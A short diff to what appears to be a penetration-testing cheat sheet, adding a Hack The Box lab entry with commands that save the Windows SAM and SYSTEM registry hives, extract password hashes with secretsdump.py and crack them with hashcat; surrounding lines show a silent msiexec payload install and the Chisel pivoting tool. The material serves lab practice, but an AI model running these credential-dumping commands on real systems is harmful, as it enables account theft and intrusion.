@@ -62,6 +62,18 @@ execute the command on the target
 msiexec /quiet /qn /i <payload>
 ```
 
+SAM (SYSTEM account) (HTB:Omni)
+
+```cmd
+reg save HKLM\SYSTEM C:\SYSTEM
+reg save HKLM\SAM C:\SAM
+```
+
+```shell
+python3 secretsdump.py -system /tmp/SYSTEM -sam /tmp/SAM LOCAL
+hashcat -m 1000 ./hash ~/Documents/rockyou.txt
+```
+
 Tools
 
 [Chisel](https://github.com/jpillora/chisel):Pivoting 
